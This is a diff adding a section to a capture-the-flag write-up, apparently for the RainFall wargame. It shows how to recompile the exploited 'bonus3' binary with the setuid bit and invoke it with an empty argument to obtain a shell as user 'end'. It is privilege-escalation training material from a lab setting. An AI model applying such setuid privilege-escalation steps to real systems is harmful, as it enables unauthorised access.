@@ -45,3 +45,24 @@ Congratulations graduate!
 Maybe should have used ```strncmp()``` instead of ```strcmp()```.
 
 Anways Congratulations graduate!
+
+## Recreate Exploited Binary
+
+As user ```end```, in ```/tmp```, create and compile ```bonus3_source.c```
+```
+end@RainFall:/tmp$ gcc bonus3_source.c -o bonus3_source
+```
+
+Edit permissions including suid, then move the binary to home directory.
+```
+end@RainFall:/tmp$ chmod u+s bonus3_source; chmod +wx ~; mv bonus3_source ~
+```
+
+Exit back to user ```bonus3```, then provide our exploit as argument to the source. Luckily, the env language var address is similar, so the return address doesn't need updating.
+```
+end@RainFall:/tmp$ exit
+exit
+bonus3@RainFall:~$ /home/user/end/bonus3_source ""
+$ whoami
+end
+```
